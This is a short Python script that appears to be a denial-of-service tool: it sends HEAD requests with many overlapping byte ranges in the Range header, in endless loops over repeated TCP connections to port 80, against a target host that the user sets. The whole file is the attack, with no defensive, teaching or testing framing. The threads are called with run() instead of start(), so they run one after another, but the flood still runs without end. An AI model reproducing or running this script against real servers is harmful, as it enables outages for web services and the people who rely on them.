import socket
import threading


target = 'localhost'  # target host name. eg. 'example.com'


dat = '''HEAD / HTTP/1.1
Host: {}
Range: bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7,7-8,8-9,9-10,10-11,11-12,12-13,13-14,0-1
Accept-Encoding: gzip
Connection: keep-alive


'''.format(target).encode('ascii')


def attack():
	while True:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((target, 80))

		while True:
			sock.send(dat)
			if sock.recv(1024) == b'':
				break


if __name__ == '__main__':
	for i in range(10):
		t = threading.Thread(target=attack).run()
